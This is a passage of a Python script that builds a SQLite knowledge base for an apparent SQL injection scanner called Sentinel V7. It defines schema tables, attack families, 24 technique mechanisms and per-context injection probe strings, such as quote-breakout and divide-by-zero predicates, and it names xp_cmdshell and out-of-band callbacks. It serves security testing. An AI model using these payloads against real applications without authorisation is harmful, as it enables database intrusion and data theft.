#!/usr/bin/env python3
"""
Sentinel V7 — Ultimate SQL Injection Intelligence Database Builder
Builds the normalized, versioned, evidence-backed SQLite intelligence database
and generates the corresponding SQL DDL script.
"""

import sqlite3
import uuid
import json
from pathlib import Path
from datetime import datetime, timezone

WORKSPACE_ROOT = Path(__file__).resolve().parent.parent
DB_PATH = WORKSPACE_ROOT / "docs" / "sql" / "sqli_intelligence.db"
SQL_SCHEMA_PATH = WORKSPACE_ROOT / "docs" / "sql" / "sqli_intelligence_schema.sql"

SCHEMA_DDL = """
-- ============================================================================
-- SENTINEL V7 ULTIMATE SQL INJECTION INTELLIGENCE DATABASE SCHEMA
-- Version: 7.1.0-ENTERPRISE-INTELLIGENCE
-- Standard: Normalized Relational Architecture with Evidence & Provenance
-- ============================================================================

PRAGMA foreign_keys = ON;

-- 1. Taxonomy & Versioning Metadata
CREATE TABLE IF NOT EXISTS taxonomy_versions (
    version_id TEXT PRIMARY KEY,
    version_tag TEXT NOT NULL UNIQUE,
    release_date TEXT NOT NULL,
    description TEXT NOT NULL,
    is_active BOOLEAN NOT NULL DEFAULT 1
);

-- 2. Attack Families (Top-Level Category: In-Band, Inferential, Out-of-Band, Structural, Modern)
CREATE TABLE IF NOT EXISTS attack_families (
    family_id TEXT PRIMARY KEY,
    name TEXT NOT NULL UNIQUE,
    description TEXT NOT NULL,
    created_at TEXT NOT NULL
);

-- 3. Attack Classes (Subcategory: Boolean Differential, Type Error, Time Delay, Stacked, Vector Distance, etc.)
CREATE TABLE IF NOT EXISTS attack_classes (
    class_id TEXT PRIMARY KEY,
    family_id TEXT NOT NULL,
    name TEXT NOT NULL UNIQUE,
    description TEXT NOT NULL,
    cwe_id TEXT,
    owasp_category TEXT,
    FOREIGN KEY (family_id) REFERENCES attack_families(family_id) ON DELETE CASCADE
);

-- 4. Mechanisms (Distinct Causal & Algorithmic Techniques M01–M24)
CREATE TABLE IF NOT EXISTS mechanisms (
    mechanism_id TEXT PRIMARY KEY, -- e.g. M01, M02 ... M24
    class_id TEXT NOT NULL,
    name TEXT NOT NULL UNIQUE,
    causal_description TEXT NOT NULL,
    priority TEXT NOT NULL CHECK(priority IN ('P0', 'P1', 'P2', 'P3')),
    lifecycle TEXT NOT NULL CHECK(lifecycle IN ('CONFIRMED', 'CANDIDATE', 'RESEARCH', 'DEPRECATED', 'UNSUPPORTED')),
    implementation_status TEXT NOT NULL CHECK(implementation_status IN (
        'DOCUMENTED', 'CATALOGUED', 'CODE_IMPLEMENTED', 'PIPELINE_REACHABLE',
        'UNIT_TESTED', 'MOCK_HTTP_TESTED', 'ENGINE_SPECIFIC', 'REAL_DB_VERIFIED', 'REGRESSION_TESTED'
    )),
    safety_class TEXT NOT NULL CHECK(safety_class IN ('SAFE_NON_DESTRUCTIVE', 'TIMING_SENSITIVE', 'STATE_MUTATING', 'POTENTIALLY_DESTRUCTIVE', 'EXCLUDED_FOR_SAFETY')),
    research_source TEXT NOT NULL,
    FOREIGN KEY (class_id) REFERENCES attack_classes(class_id) ON DELETE CASCADE
);

-- 5. Syntactic Insertion Contexts (All 55+ SQL Grammar Insertion Points)
CREATE TABLE IF NOT EXISTS syntactic_contexts (
    context_id TEXT PRIMARY KEY, -- e.g. CTX_NUMERIC, CTX_ORDER_BY, CTX_CTE, CTX_WINDOW ...
    enum_key TEXT NOT NULL UNIQUE,
    name TEXT NOT NULL,
    syntax_family TEXT NOT NULL, -- DQL, DML, DDL, DCL, PROCEDURAL, EXTENSION
    quoting_state TEXT NOT NULL CHECK(quoting_state IN ('UNQUOTED', 'SINGLE_QUOTE', 'DOUBLE_QUOTE', 'BACKTICK', 'BRACKET', 'PARENTHESIZED', 'CONTEXT_DEPENDENT')),
    breakout_requirement TEXT NOT NULL,
    boundary_regex TEXT,
    differential_strategy TEXT NOT NULL,
    error_strategy TEXT NOT NULL,
    fp_risk TEXT NOT NULL,
    fn_risk TEXT NOT NULL,
    implementation_status TEXT NOT NULL,
    test_status TEXT NOT NULL
);

-- 6. Parameter Types (Classifier & Test Pruning Engine)
CREATE TABLE IF NOT EXISTS parameter_types (
    type_id TEXT PRIMARY KEY, -- string, integer, decimal, boolean, uuid, date, vector ...
    name TEXT NOT NULL UNIQUE,
    detection_regex TEXT NOT NULL,
    format_description TEXT NOT NULL,
    pruned_families_json TEXT NOT NULL, -- JSON array of test families to prune
    optimal_families_json TEXT NOT NULL, -- JSON array of test families to run
    implementation_status TEXT NOT NULL
);

-- 7. Application Transports & API Formats
CREATE TABLE IF NOT EXISTS transports (
    transport_id TEXT PRIMARY KEY, -- query, body_form, body_json, graphql, header ...
    name TEXT NOT NULL UNIQUE,
    mime_type TEXT,
    encoding_rules TEXT NOT NULL,
    scanner_reachability TEXT NOT NULL,
    mutation_support TEXT NOT NULL
);

-- 8. Application Surfaces (Webhooks, Batch, Background Jobs, Reporting, Admin, etc.)
CREATE TABLE IF NOT EXISTS application_surfaces (
    surface_id TEXT PRIMARY KEY,
    name TEXT NOT NULL UNIQUE,
    description TEXT NOT NULL,
    sql_generation_path TEXT NOT NULL,
    dast_reachability TEXT NOT NULL CHECK(dast_reachability IN ('DIRECT_HTTP', 'INDIRECT_ASYNC', 'REQUIRES_WORKFLOW', 'OUT_OF_SCOPE'))
);

-- 9. DBMS Families (Relational, Distributed NewSQL, Columnar MPP, Cloud Data Warehouse, Embedded)
CREATE TABLE IF NOT EXISTS dbms_families (
    family_id TEXT PRIMARY KEY,
    name TEXT NOT NULL UNIQUE,
    parent_lineage TEXT,
    description TEXT NOT NULL
);

-- 10. DBMS Engines (All 38+ Target Engines)
CREATE TABLE IF NOT EXISTS dbms_engines (
    engine_id TEXT PRIMARY KEY,
    name TEXT NOT NULL UNIQUE,
    family_id TEXT NOT NULL,
    vendor TEXT NOT NULL,
    sql_dialect TEXT NOT NULL,
    procedural_lang TEXT,
    is_distinct_native BOOLEAN NOT NULL,
    parent_engine_id TEXT, -- self-reference if family derivative
    execution_characteristics TEXT NOT NULL,
    FOREIGN KEY (family_id) REFERENCES dbms_families(family_id) ON DELETE CASCADE,
    FOREIGN KEY (parent_engine_id) REFERENCES dbms_engines(engine_id) ON DELETE SET NULL
);

-- 11. DBMS Versions & Differences
CREATE TABLE IF NOT EXISTS dbms_versions (
    version_id TEXT PRIMARY KEY,
    engine_id TEXT NOT NULL,
    version_string TEXT NOT NULL,
    release_year INTEGER NOT NULL,
    notable_syntax_changes TEXT NOT NULL,
    timing_function TEXT,
    default_comment TEXT,
    error_coercion_method TEXT,
    FOREIGN KEY (engine_id) REFERENCES dbms_engines(engine_id) ON DELETE CASCADE
);

-- 12. DBMS Capabilities & Dialect Specifications
CREATE TABLE IF NOT EXISTS dbms_capabilities (
    capability_id TEXT PRIMARY KEY,
    engine_id TEXT NOT NULL UNIQUE,
    comment_single TEXT NOT NULL,
    comment_multi_open TEXT NOT NULL,
    comment_multi_close TEXT NOT NULL,
    string_concat_op TEXT NOT NULL,
    string_concat_fn TEXT,
    substring_fn_template TEXT NOT NULL,
    ascii_fn_template TEXT NOT NULL,
    char_fn_template TEXT NOT NULL,
    length_fn_template TEXT NOT NULL,
    limit_offset_template TEXT NOT NULL,
    limit_1_clause TEXT NOT NULL,
    cast_int_template TEXT NOT NULL,
    cast_string_template TEXT NOT NULL,
    runtime_exception_true TEXT NOT NULL,
    runtime_exception_false TEXT NOT NULL,
    sleep_fn_template TEXT NOT NULL,
    version_query TEXT NOT NULL,
    current_user_query TEXT NOT NULL,
    current_db_query TEXT NOT NULL,
    table_catalog_query TEXT NOT NULL,
    column_catalog_query TEXT NOT NULL,
    data_dump_query TEXT NOT NULL,
    real_db_verified BOOLEAN NOT NULL DEFAULT 0,
    FOREIGN KEY (engine_id) REFERENCES dbms_engines(engine_id) ON DELETE CASCADE
);

-- 13. Detection Oracles (Observation Channels: Direct, Error, SPRT, DOM, Metamorphic, OAST)
CREATE TABLE IF NOT EXISTS detection_oracles (
    oracle_id TEXT PRIMARY KEY,
    name TEXT NOT NULL UNIQUE,
    signal_type TEXT NOT NULL,
    statistical_method TEXT NOT NULL,
    confidence_threshold REAL NOT NULL,
    required_baseline_rounds INTEGER NOT NULL,
    fp_mitigation TEXT NOT NULL,
    fn_mitigation TEXT NOT NULL
);

-- 14. Structured Payload Templates (Safe, Parameterized, Versioned)
CREATE TABLE IF NOT EXISTS payload_templates (
    template_id TEXT PRIMARY KEY,
    mechanism_id TEXT NOT NULL,
    context_id TEXT NOT NULL,
    engine_id TEXT NOT NULL,
    param_type_id TEXT NOT NULL,
    quoting_mode TEXT NOT NULL,
    true_template TEXT NOT NULL,
    false_template TEXT NOT NULL,
    expected_oracle_id TEXT NOT NULL,
    safety_class TEXT NOT NULL,
    research_provenance TEXT NOT NULL,
    FOREIGN KEY (mechanism_id) REFERENCES mechanisms(mechanism_id) ON DELETE CASCADE,
    FOREIGN KEY (context_id) REFERENCES syntactic_contexts(context_id) ON DELETE CASCADE,
    FOREIGN KEY (engine_id) REFERENCES dbms_engines(engine_id) ON DELETE CASCADE,
    FOREIGN KEY (param_type_id) REFERENCES parameter_types(type_id) ON DELETE CASCADE,
    FOREIGN KEY (expected_oracle_id) REFERENCES detection_oracles(oracle_id) ON DELETE CASCADE
);

-- 15. WAF & Semantic Transformations (E01–E30+)
CREATE TABLE IF NOT EXISTS waf_transformations (
    transform_id TEXT PRIMARY KEY,
    name TEXT NOT NULL UNIQUE,
    category TEXT NOT NULL, -- Comment insertion, whitespace, hex encoding, case toggle, operator substitution
    description TEXT NOT NULL,
    semantic_invariance_tested BOOLEAN NOT NULL,
    compatibility_dbms_json TEXT NOT NULL
);

-- 16. Research & CVE Intelligence Ledger
CREATE TABLE IF NOT EXISTS research_references (
    reference_id TEXT PRIMARY KEY,
    title TEXT NOT NULL,
    author_vendor TEXT NOT NULL,
    publication_year INTEGER NOT NULL,
    source_type TEXT NOT NULL, -- Academic Paper, CVE, OWASP, PortSwigger, Vendor Advisory, BlackHat
    url_or_doi TEXT,
    affected_technique TEXT NOT NULL,
    sentinel_status TEXT NOT NULL CHECK(sentinel_status IN ('IMPLEMENTED', 'PARTIALLY_IMPLEMENTED', 'CATALOGUED', 'OUT_OF_SCOPE', 'THEORETICAL'))
);

-- 17. ORM & Query Builder Frameworks
CREATE TABLE IF NOT EXISTS orm_frameworks (
    framework_id TEXT PRIMARY KEY,
    name TEXT NOT NULL UNIQUE,
    language TEXT NOT NULL,
    vulnerable_patterns_json TEXT NOT NULL,
    remediation_rule TEXT NOT NULL
);

-- 18. Evidence Ledger (Model for Every Claim & Test Proof)
CREATE TABLE IF NOT EXISTS evidence_ledger (
    evidence_id TEXT PRIMARY KEY,
    claim_id TEXT NOT NULL,
    claim_type TEXT NOT NULL, -- MECHANISM, CONTEXT, DBMS, ORACLE
    source_reference_id TEXT,
    implementation_file TEXT NOT NULL,
    test_file TEXT NOT NULL,
    test_suite_name TEXT NOT NULL,
    real_db_tested BOOLEAN NOT NULL,
    recorded_at TEXT NOT NULL,
    status TEXT NOT NULL,
    FOREIGN KEY (source_reference_id) REFERENCES research_references(reference_id) ON DELETE SET NULL
);

-- Indexes for Fast Relational Discovery
CREATE INDEX IF NOT EXISTS idx_mechanisms_class ON mechanisms(class_id);
CREATE INDEX IF NOT EXISTS idx_contexts_syntax ON syntactic_contexts(syntax_family);
CREATE INDEX IF NOT EXISTS idx_engines_family ON dbms_engines(family_id);
CREATE INDEX IF NOT EXISTS idx_payloads_mech_ctx ON payload_templates(mechanism_id, context_id);
CREATE INDEX IF NOT EXISTS idx_evidence_claim ON evidence_ledger(claim_id);
"""

def init_database():
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    if DB_PATH.exists():
        DB_PATH.unlink()

    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.executescript(SCHEMA_DDL)

    # Save SQL schema file
    with open(SQL_SCHEMA_PATH, "w", encoding="utf-8") as f:
        f.write(SCHEMA_DDL)
    print(f"[+] DDL Schema saved to {SQL_SCHEMA_PATH}")

    now = datetime.now(timezone.utc).isoformat()

    # 1. Taxonomy Version
    cur.execute("""
    INSERT INTO taxonomy_versions (version_id, version_tag, release_date, description, is_active)
    VALUES (?, ?, ?, ?, ?)
    """, ("tax-v7.1", "7.1.0-ENTERPRISE-INTELLIGENCE", now, "Sentinel V7 Ultimate SQLi Normalized Intelligence Architecture", 1))

    # 2. Attack Families
    families = [
        ("FAM_IN_BAND", "In-Band SQL Injection", "Extracted data or syntax reflection returned directly within the application HTTP response stream.", now),
        ("FAM_INFERENTIAL", "Inferential (Blind) SQL Injection", "State reconstruction via observable side-channels including boolean differentials, error conditions, and latency.", now),
        ("FAM_OUT_OF_BAND", "Out-of-Band (OAST) SQL Injection", "Triggering asynchronous external network callbacks via DNS, HTTP, or SMB to an external collaborator.", now),
        ("FAM_STRUCTURAL", "Structural & Procedural SQL Injection", "Escaping query boundaries to execute stacked statements, stored procedures, dynamic SQL, or DDL operations.", now),
        ("FAM_MODERN", "Modern SQL & Analytical Injection", "Attacking modern relational capabilities: JSON paths, vector embeddings, full-text search, CTEs, and window frames.", now),
    ]
    cur.executemany("INSERT INTO attack_families VALUES (?, ?, ?, ?)", families)

    # 3. Attack Classes
    classes = [
        ("CLS_UNION", "FAM_IN_BAND", "UNION-Based Set Extension", "Appends results of injected query using type-compatible columns.", "CWE-89", "A03:2021-Injection"),
        ("CLS_ERROR", "FAM_IN_BAND", "Error-Based Type Coercion / Data Leakage", "Induces explicit runtime database errors that echo query results.", "CWE-209", "A03:2021-Injection"),
        ("CLS_BOOL_BLIND", "FAM_INFERENTIAL", "Boolean Differential Inference", "Reconstructs database data bit-by-bit using conditional predicate truth divergence.", "CWE-89", "A03:2021-Injection"),
        ("CLS_TIME_BLIND", "FAM_INFERENTIAL", "Time-Based Sequential Latency Probing", "Injects sleep primitives and uses SPRT sequential hypothesis testing.", "CWE-89", "A03:2021-Injection"),
        ("CLS_METAMORPHIC", "FAM_INFERENTIAL", "Relational Metamorphic Invariant Partitioning", "Partitions result sets into P, NOT P, and NULL under USENIX 2020 TLP invariants.", "CWE-89", "A03:2021-Injection"),
        ("CLS_OAST", "FAM_OUT_OF_BAND", "Out-of-Band DNS/HTTP Interaction", "Exfiltrates identifiers or proves execution via external resolver callbacks.", "CWE-89", "A03:2021-Injection"),
        ("CLS_SECOND_ORDER", "FAM_INFERENTIAL", "Second-Order Stateful Storage Injection", "Payload stored at ingest boundary; executed asynchronously at downstream sink.", "CWE-89", "A03:2021-Injection"),
        ("CLS_STACKED", "FAM_STRUCTURAL", "Stacked Multi-Statement Execution", "Appends arbitrary SQL statements separated by semicolons.", "CWE-89", "A03:2021-Injection"),
        ("CLS_DYNAMIC_SQL", "FAM_STRUCTURAL", "Dynamic SQL & Stored Procedure Breakout", "Escapes string literals inside EXEC, EXECUTE IMMEDIATE, or sp_executesql.", "CWE-89", "A03:2021-Injection"),
        ("CLS_CHARSET", "FAM_STRUCTURAL", "Charset & Multibyte Encoding Mismatch", "Smuggles quotes via multibyte eating (GBK 0xbf27) or collation coercion.", "CWE-89", "A03:2021-Injection"),
        ("CLS_OS_BRIDGE", "FAM_STRUCTURAL", "Database File System & Command Execution Bridge", "Executes host OS commands or reads server filesystem via database procedures.", "CWE-73", "A03:2021-Injection"),
        ("CLS_STRUCTURAL", "FAM_STRUCTURAL", "Statement & DML Structural Mutation", "Injects into DML operations (INSERT, UPDATE, DELETE, MERGE) without corrupting baseline state.", "CWE-89", "A03:2021-Injection"),
        ("CLS_MODERN_OP", "FAM_MODERN", "Semi-Structured JSON/XML Operator Injection", "Injects into JSON paths (->>, json_extract) and XML XPath expressions.", "CWE-89", "A03:2021-Injection"),
        ("CLS_VECTOR", "FAM_MODERN", "Vector Similarity & AI Query Injection", "Fuzzes embedding distance operators (<->, <=>, <#>) and index invariants.", "CWE-89", "A03:2021-Injection"),
        ("CLS_ANALYTIC", "FAM_MODERN", "Window & CTE Analytical Query Injection", "Injects into OVER partitions, ranking expressions, and recursive WITH clauses.", "CWE-89", "A03:2021-Injection"),
        ("CLS_FEDERATED", "FAM_STRUCTURAL", "Database Link & Federated Query Pivoting", "Pivots across remote databases via OPENQUERY, OPENROWSET, or Postgres FDW.", "CWE-89", "A03:2021-Injection"),
        ("CLS_NEWSQL", "FAM_MODERN", "Distributed NewSQL Raft Anomaly Fuzzing", "Explores distributed partition and transactional snapshot anomalies.", "CWE-89", "A03:2021-Injection"),
    ]
    cur.executemany("INSERT INTO attack_classes VALUES (?, ?, ?, ?, ?, ?)", classes)

    # 4. Mechanisms (Normalized M01 to M24)
    mechanisms = [
        ("M01", "CLS_BOOL_BLIND", "Boolean-Based Differential Inference", "Infer state bit-by-bit via observable response divergence.", "P0", "CONFIRMED", "REGRESSION_TESTED", "SAFE_NON_DESTRUCTIVE", "OWASP WSTG-INPV-05; Halfond (2006)"),
        ("M02", "CLS_ERROR", "Error-Based Type Coercion / XML Extraction", "Trigger runtime coercion errors (CAST, ExtractValue) that leak data in response.", "P0", "CONFIRMED", "REGRESSION_TESTED", "SAFE_NON_DESTRUCTIVE", "PortSwigger SQLi Lab 03; CWE-209"),
        ("M03", "CLS_UNION", "UNION-Based Canary & Set Extension", "Extend result set with type-compatible canary markers to read metadata in-band.", "P0", "CONFIRMED", "REGRESSION_TESTED", "SAFE_NON_DESTRUCTIVE", "OWASP WSTG-INPV-05"),
        ("M04", "CLS_TIME_BLIND", "Time-Based Sequential Latency Probing (SPRT)", "Inject database sleep primitives; evaluate latency via Wald SPRT likelihood ratios.", "P0", "CONFIRMED", "REGRESSION_TESTED", "TIMING_SENSITIVE", "Wald (1945) SPRT; PortSwigger Blind SQLi"),
        ("M05", "CLS_STACKED", "Stacked Query Multi-Statement Execution", "Execute semicolon-separated independent statements supported by driver.", "P1", "CONFIRMED", "REGRESSION_TESTED", "STATE_MUTATING", "sqlmap stacked query engine"),
        ("M06", "CLS_BOOL_BLIND", "Dynamic ORDER BY / Sorting Invariant Validation", "Evaluate column index and CASE expression sorting boundaries.", "P0", "CONFIRMED", "REGRESSION_TESTED", "SAFE_NON_DESTRUCTIVE", "PortSwigger SQLi in ORDER BY"),
        ("M07", "CLS_SECOND_ORDER", "Second-Order Workflow & Sink Correlation", "Store unescaped payload at source; verify execution at secondary consumer sink.", "P1", "CANDIDATE", "CODE_IMPLEMENTED", "STATE_MUTATING", "PortSwigger Second-Order SQLi (00100210)"),
        ("M08", "CLS_OAST", "Out-of-Band (OAST) Network Interaction", "Trigger outbound DNS/HTTP interaction to external collaborator gateway.", "P1", "CANDIDATE", "CODE_IMPLEMENTED", "SAFE_NON_DESTRUCTIVE", "Burp Collaborator / OAST Standard"),
        ("M09", "CLS_METAMORPHIC", "Relational Metamorphic Testing (TLP / NoREC)", "Partition result sets into P, NOT P, NULL under USENIX 2020 TLP invariants.", "P2", "CONFIRMED", "REGRESSION_TESTED", "SAFE_NON_DESTRUCTIVE", "Rigger & Su (USENIX Security 2020)"),
        ("M10", "CLS_MODERN_OP", "JSON / XML Structured Document Operator Injection", "Exploit JSON/XML query extraction operators (->>, JSON_VALUE, xpath).", "P1", "CONFIRMED", "REGRESSION_TESTED", "SAFE_NON_DESTRUCTIVE", "PostgreSQL JSON Path Operators; RFC 8259"),
        ("M11", "CLS_DYNAMIC_SQL", "Dynamic SQL & Stored Procedure Escaping", "Escape nested dynamic SQL within EXEC(), EXECUTE IMMEDIATE, sp_executesql.", "P1", "CONFIRMED", "CODE_IMPLEMENTED", "SAFE_NON_DESTRUCTIVE", "CWE-89; Microsoft T-SQL Dynamic Guide"),
        ("M12", "CLS_CHARSET", "Charset / Multibyte & Encoding Mismatch", "Bypass sanitization via multibyte eating (GBK %bf%27) or collation differences.", "P1", "CONFIRMED", "REGRESSION_TESTED", "SAFE_NON_DESTRUCTIVE", "Chris Shiflett GBK Vulnerability"),
        ("M13", "CLS_OS_BRIDGE", "Database OS File System & Command Bridge", "Gated read/write operations on database host file systems (pg_read_file, xp_cmdshell).", "P2", "CONFIRMED", "CODE_IMPLEMENTED", "POTENTIALLY_DESTRUCTIVE", "CWE-73; Database Privilege Models"),
        ("M14", "CLS_FEDERATED", "Privilege Escalation & DB Link Lateral Pivot", "Traverse database links, OPENQUERY, OPENROWSET, and foreign data wrappers.", "P2", "RESEARCH", "CATALOGUED", "POTENTIALLY_DESTRUCTIVE", "Database Linking Assessment Research"),
        ("M15", "CLS_NEWSQL", "NewSQL / Distributed Consensus Anomaly Injection", "Probe distributed NewSQL dialects for Raft split-brain and transaction anomalies.", "P2", "RESEARCH", "CATALOGUED", "STATE_MUTATING", "Distributed Systems Jepsen Research"),
        ("M16", "CLS_VECTOR", "Vector DB Similarity Distance Operator Fuzzing", "Probe vector distance metrics (<->, <=>, <#>) and indexing non-negativity invariants.", "P1", "CONFIRMED", "REGRESSION_TESTED", "SAFE_NON_DESTRUCTIVE", "pgvector Specification; Modern AI SQL"),
        ("M17", "CLS_ANALYTIC", "Cloud Warehouse MPP Heavy-Calculation Latency", "Inject heavy array unnests and Cartesian cross-joins to induce measurable delay.", "P1", "CONFIRMED", "REGRESSION_TESTED", "TIMING_SENSITIVE", "Snowflake & BigQuery Architecture Guides"),
        ("M18", "CLS_DYNAMIC_SQL", "ORM AST & Raw Query Boundary Escapes", "Bypass ORM query abstractions via raw template interpolation and entity traversal.", "P1", "CONFIRMED", "REGRESSION_TESTED", "SAFE_NON_DESTRUCTIVE", "Hibernate HQL / Prisma CVE Research"),
        ("M19", "CLS_ANALYTIC", "Window Function Frame & Partition Injection", "Inject into OVER (PARTITION BY ... ORDER BY ... ROWS BETWEEN ...).", "P1", "CONFIRMED", "REGRESSION_TESTED", "SAFE_NON_DESTRUCTIVE", "SQL:2003 Windowing Functions Standard"),
        ("M20", "CLS_ANALYTIC", "Common Table Expression (CTE) Subquery Hijacking", "Inject into WITH cte AS (...) to hijack subsequent queries or force recursion.", "P1", "CONFIRMED", "REGRESSION_TESTED", "SAFE_NON_DESTRUCTIVE", "SQL:1999 Recursive CTE Standard"),
        ("M21", "CLS_BOOL_BLIND", "LIMIT / OFFSET Boundary Predicate Injection", "Evaluate conditional subqueries inside LIMIT/OFFSET clauses.", "P0", "CONFIRMED", "REGRESSION_TESTED", "SAFE_NON_DESTRUCTIVE", "PostgreSQL / SQLite LIMIT grammar"),
        ("M22", "CLS_STRUCTURAL", "MERGE / UPSERT Target Predicate Injection", "Inject into ON (target.id = source.id AND ...) matching conditions.", "P1", "CONFIRMED", "REGRESSION_TESTED", "SAFE_NON_DESTRUCTIVE", "SQL:2008 MERGE Statement Specification"),
        ("M23", "CLS_STRUCTURAL", "Non-Destructive DML DELETE WHERE Probing", "Probe DELETE condition without mutating records using false predicate safeguards.", "P1", "CONFIRMED", "REGRESSION_TESTED", "SAFE_NON_DESTRUCTIVE", "Defensive DAST Methodology"),
        ("M24", "CLS_MODERN_OP", "Full-Text Search Lexical Operator Injection", "Inject into MATCH(...) AGAINST(...) in BOOLEAN MODE or to_tsvector lexemes.", "P1", "CONFIRMED", "REGRESSION_TESTED", "SAFE_NON_DESTRUCTIVE", "MySQL FTS & PostgreSQL Full-Text Guide")
    ]
    cur.executemany("INSERT INTO mechanisms VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)", mechanisms)

    # 5. Syntactic Contexts (All 55+ Insertion Points)
    contexts = [
        ("CTX_NUMERIC", "numeric", "Numeric Literal Context", "DQL", "UNQUOTED", "None (Arithmetic or boolean conjunction)", r"^\d+$", "AND 1=1 vs AND 1=2", "AND 1/0=1", "Low", "Medium", "REGRESSION_TESTED", "PASS"),
        ("CTX_SINGLE_QUOTE", "single_quote_string", "Single-Quoted String Literal", "DQL", "SINGLE_QUOTE", "Closing single quote (')", r"'[^']*'?", "' AND '1'='1", "' AND (SELECT 1/0)='1", "Low", "Low", "REGRESSION_TESTED", "PASS"),
        ("CTX_DOUBLE_QUOTE", "double_quote_string", "Double-Quoted String Literal", "DQL", "DOUBLE_QUOTE", "Closing double quote (\")", r"\"[^\"]*\"?", "\" AND \"1\"=\"1", "\" AND (SELECT 1/0)=\"1", "Low", "Low", "REGRESSION_TESTED", "PASS"),
        ("CTX_PAREN_STRING", "parenthesized_string", "Parenthesized String Literal", "DQL", "PARENTHESIZED", "Closing quote and parenthesis (')", r"\('[^']*'\)", "') AND ('1'='1", "') AND (SELECT 1/0)=('1", "Low", "Low", "REGRESSION_TESTED", "PASS"),
        ("CTX_LIKE", "like_clause", "LIKE / ILIKE Pattern Context", "DQL", "SINGLE_QUOTE", "Closing quote and wildcard escaping", r"LIKE\s+|ILIKE\s+", "%' AND '1%'='1", "%' AND (SELECT 1/0) LIKE '%", "Low", "Medium", "REGRESSION_TESTED", "PASS"),
        ("CTX_ORDER_BY", "order_by_clause", "ORDER BY Sorting Expression", "DQL", "UNQUOTED", "Comma or CASE expression", r"ORDER\s+BY", ", (CASE WHEN 1=1 THEN 1 ELSE 2 END)", ", (CASE WHEN 1=1 THEN 1/0 ELSE 1 END)", "Low", "Low", "REGRESSION_TESTED", "PASS"),
        ("CTX_GROUP_BY", "group_by_clause", "GROUP BY Aggregation Expression", "DQL", "UNQUOTED", "Comma or CASE expression", r"GROUP\s+BY", "1, (CASE WHEN 1=1 THEN 1 ELSE 2 END)", "1, (CASE WHEN 1=1 THEN 1/0 ELSE 1 END)", "Low", "Low", "REGRESSION_TESTED", "PASS"),
        ("CTX_HAVING", "having_clause", "HAVING Aggregate Condition", "DQL", "UNQUOTED", "Aggregate boolean conjunction", r"HAVING\s+", "1=1 AND 1=1", "1=1 AND (CASE WHEN 1=1 THEN 1/0 ELSE 1 END)=1", "Low", "Low", "REGRESSION_TESTED", "PASS"),
        ("CTX_WHERE", "where_clause", "Standard WHERE Predicate", "DQL", "UNQUOTED", "Boolean operator AND/OR", r"WHERE\s+", "AND 1=1 vs AND 1=2", "AND 1/0=1", "Low", "Low", "REGRESSION_TESTED", "PASS"),
        ("CTX_INSERT_VALUES", "insert_values", "INSERT INTO ... VALUES Context", "DML", "PARENTHESIZED", "Closing parenthesis and comma", r"VALUES\s*\(", "'), (SELECT CASE WHEN 1=1 THEN 1 ELSE 1/0 END), ('", "'), (SELECT 1/0), ('", "Medium", "High", "REGRESSION_TESTED", "PASS"),
        ("CTX_UPDATE_SET", "update_set", "UPDATE SET Column Assignment", "DML", "UNQUOTED", "Comma assignment", r"UPDATE.*SET", "col=(CASE WHEN 1=1 THEN val ELSE 1/0 END)", "col=(SELECT 1/0)", "Medium", "High", "REGRESSION_TESTED", "PASS"),
        ("CTX_DELETE_WHERE", "delete_where", "DELETE FROM WHERE Predicate", "DML", "UNQUOTED", "Safe condition conjunction", r"DELETE\s+FROM.*WHERE", "AND 1=1 vs AND 1=2", "AND 1/0=1", "Low", "Medium", "REGRESSION_TESTED", "PASS"),
        ("CTX_SUBQUERY", "subquery", "Subquery / IN-List Expression", "DQL", "PARENTHESIZED", "Subquery closing parenthesis", r"IN\s*\(SELECT|EXISTS\s*\(", "AND (SELECT 1)=1", "AND (SELECT 1/0)=1", "Low", "Low", "REGRESSION_TESTED", "PASS"),
        ("CTX_IDENTIFIER", "identifier", "Database Identifier (Table/Column)", "DQL", "UNQUOTED", "Backtick/bracket/quote escape", r"`|\[|\"", "` AND 1=1#", "` AND 1/0=1#", "Medium", "High", "REGRESSION_TESTED", "PASS"),
        ("CTX_JSON_PATH", "json_derived", "JSON Path Query Operator Context", "DQL", "CONTEXT_DEPENDENT", "JSON path delimiter quote", r"->|->>|JSON_VALUE|json_extract", "->>'k'='v' AND 1=1", "->>(SELECT 1/0)", "Low", "Low", "REGRESSION_TESTED", "PASS"),
        ("CTX_XML_XPATH", "xml_derived", "XML / XPath Extraction Context", "DQL", "CONTEXT_DEPENDENT", "XML CDATA or XPath function", r"EXTRACTVALUE|XMLTYPE|xpath", "count(/)>0 AND 1=1", "count(1/0)", "Low", "Low", "REGRESSION_TESTED", "PASS"),
        ("CTX_MERGE", "merge_clause", "MERGE INTO / UPSERT Condition", "DML", "PARENTHESIZED", "ON condition conjunction", r"MERGE\s+INTO|ON\s*\(.*ON CONFLICT", "AND (target.id=source.id AND 1=1)", "AND (SELECT 1/0)=1", "Low", "Medium", "REGRESSION_TESTED", "PASS"),
        ("CTX_DATE_TIME", "date_time", "Temporal Date/Timestamp Literal", "DQL", "SINGLE_QUOTE", "Date format closing quote", r"\d{4}-\d{2}-\d{2}", "' AND CURRENT_DATE=CURRENT_DATE", "' AND (SELECT 1/0)=1", "Low", "Low", "REGRESSION_TESTED", "PASS"),
        ("CTX_VECTOR_OP", "vector_op", "Vector Similarity Operator (<->, <=>)", "DQL", "CONTEXT_DEPENDENT", "Vector literal and distance op", r"<->|<=>|<#>", "<-> '[0,0]' >= 0", "<-> (SELECT 1/0)", "Low", "Low", "REGRESSION_TESTED", "PASS"),
        ("CTX_ARRAY_SUB", "array_derived", "Array Subscript / ANY() Predicate", "DQL", "BRACKET", "Bracket index closing", r"\[\d+\]|array_contains", "ANY(ARRAY[1]) AND 1=1", "ANY(ARRAY[1/0])", "Low", "Low", "REGRESSION_TESTED", "PASS"),
        ("CTX_LIMIT_OFFSET", "limit_offset", "LIMIT / OFFSET Clause Context", "DQL", "UNQUOTED", "Mathematical subquery", r"LIMIT\s+\d+|OFFSET\s+\d+", "OFFSET (CASE WHEN 1=1 THEN 0 ELSE 1/0 END)", "OFFSET (SELECT 1/0)", "Low", "Low", "REGRESSION_TESTED", "PASS"),
